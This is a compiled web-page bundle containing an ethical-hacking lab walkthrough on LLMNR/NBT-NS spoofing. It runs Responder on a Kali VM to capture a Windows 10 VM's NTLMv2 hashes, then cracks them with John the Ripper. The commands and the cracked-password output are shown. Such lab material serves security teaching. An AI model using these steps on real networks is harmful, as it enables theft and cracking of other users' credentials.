import{_ as a,c as s,a1 as n,o as t}from"./chunks/framework.BDxlaA_J.js";const u=JSON.parse('{"title":"LLMNR/NBT-NS","description":"","frontmatter":{},"headers":[],"relativePath":"categories/ethical-hacking-labs/5-system-hacking/1-LLMNR-NBT-NS.md","filePath":"categories/ethical-hacking-labs/5-system-hacking/1-LLMNR-NBT-NS.md"}'),o={name:"categories/ethical-hacking-labs/5-system-hacking/1-LLMNR-NBT-NS.md"};function i(r,e,l,c,p,d){return t(),s("div",null,e[0]||(e[0]=[n(`<h1 id="llmnr-nbt-ns" tabindex="-1">LLMNR/NBT-NS <a class="header-anchor" href="#llmnr-nbt-ns" aria-label="Permalink to &quot;LLMNR/NBT-NS&quot;">​</a></h1><p>Link-Local Multicast Name Resolution (LLMNR) and Netbios Name Service (NBT-NS) are two components of Microsoft Windows machines. LLMNR was introduced in Windows Vista and is the successor to NBT-NS.</p><p>When a DNS name server request fails, Link-Local Multicast Name Resolution(LLMNR) and Net-BIOS Name Service(NBT-NS) is used by Windows machines as a fallback. If the DNS name still remains unresolved, the windows performs an unauthenticated UDP broadcast to the whole network. Any masquerading machine, claiming to be the server then sends a response and capture the target&#39;s credentials during the authentication process.</p><p><strong>LLMNR/NBT-NS Spoofing attack</strong> is a classical internal network attack that still works, due to low awareness and the fact it&#39;s enabled by default in Windows.</p><p><img src="https://www.verifyit.nl/wp/wp-content/uploads/2016/12/llmnr_poison1.jpg" alt="LLMNR spoofing"></p><p>LLMNR and NBT-NS are enabled by default in Windows and can be used to extract the passwords hashes from a user. There is a good chance of acquiring the user credentials on a internal network.</p><p>By listening for LLMNR/NBT-NS broadcast requests, it is possible for an attacker to spoof itself as the server and send a response claiming to be the legitimate server. After the victim system accepts the connection, it is possible to gain the victim&#39;s user-credentials by using a tool like Responder.py.</p><h3 id="objectives" tabindex="-1">Objectives <a class="header-anchor" href="#objectives" aria-label="Permalink to &quot;Objectives&quot;">​</a></h3><ul><li>Perform LLMNR/NBT-NS spoofing attack.</li></ul><h3 id="requesites" tabindex="-1">Requesites <a class="header-anchor" href="#requesites" aria-label="Permalink to &quot;Requesites&quot;">​</a></h3><ul><li>Windows 10 virtual machine.</li><li>Kali Linux virtual machine.</li></ul><h2 id="using-responder" tabindex="-1">Using Responder <a class="header-anchor" href="#using-responder" aria-label="Permalink to &quot;Using Responder&quot;">​</a></h2><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/15fe651f34614ca182b0be697245a83c76e73a2b/responder-banner.png" alt="responder banner"></p><ol><li>Launch and login to Windows 10 machine. (Make sure to select a common password that &#39;non-tech&#39; people will use - i.e <strong>qwerty</strong>).</li><li>Go to Kali Linux and open the Terminal window.</li><li>Start Responder to listen the network interface. (You can type <code>responder -h</code> to see the options available).</li></ol><p><code>responder -I eth0</code></p><ol start="4"><li>Now go back to the Windows 10 machine and let&#39;s assume that you want to access a shared network drive connected in your network. Launch <strong>run</strong> and type:</li></ol><p><code>\\\\ceh-tools</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/15fe651f34614ca182b0be697245a83c76e73a2b/run-cehtools.png" alt="run"></p><h2 id="obtaining-and-cracking-the-hashes" tabindex="-1">Obtaining and Cracking the Hashes <a class="header-anchor" href="#obtaining-and-cracking-the-hashes" aria-label="Permalink to &quot;Obtaining and Cracking the Hashes&quot;">​</a></h2><p>On the Kali Machine, Responder starts capturing the access logs of Windows 10 machine as shown below:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/b5a69b422beda8c658e0610af852f006af262dcf/responder-1.png" alt="responder response"></p><ol start="5"><li>Go to <strong>/usr/share/responder/logs/</strong> and open the last file created by responder:</li></ol><p><strong>SMB-NTLMv2-SSP-10.0.2.39.txt</strong><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3e6cd9f2c6e3f1d27820e459b0d2625aa19cb229/responder-log-3.png" alt="responder log" title="Responder Log file"></p><p>These are hashes of the logged in user collected by responder. Now let&#39;s crack these hashes.</p><p>To crack the passwords we will use <a href="https://www.openwall.com/john/" target="_blank" rel="noreferrer">JohnTheRipper</a>.</p><ol start="6"><li>Open a new Terminal window and type <code>john</code> and the path to the responder logs + the name of your log file (note the file name may differ from your lab environment):</li></ol><p><code>john /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.2.39.txt</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Using default input encoding: UTF-8</span></span>
<span class="line"><span>Loaded 4 password hashes with 4 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span></span>
<span class="line"><span>Will run 2 OpenMP threads</span></span>
<span class="line"><span>Proceeding with single, rules:Single</span></span>
<span class="line"><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span></span>
<span class="line"><span>Almost done: Processing the remaining buffered candidate passwords, if any.</span></span>
<span class="line"><span>Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.</span></span>
<span class="line"><span>Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span></span>
<span class="line"><span>qwerty           (Dummy)</span></span>
<span class="line"><span>qwerty           (Dummy)</span></span>
<span class="line"><span>qwerty           (Dummy)</span></span>
<span class="line"><span>qwerty           (Dummy)</span></span>
<span class="line"><span>4g 0:00:00:00 DONE 2/3 (2019-12-11 13:51) 26.66g/s 357713p/s 378293c/s 378293C/s 123456..random</span></span>
<span class="line"><span>Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably</span></span>
<span class="line"><span>Session completed</span></span></code></pre></div><p>The cracked passwords hashes of the Dummy user has shown in the output above.</p>`,29)]))}const g=a(o,[["render",i]]);export{u as __pageData,g as default};
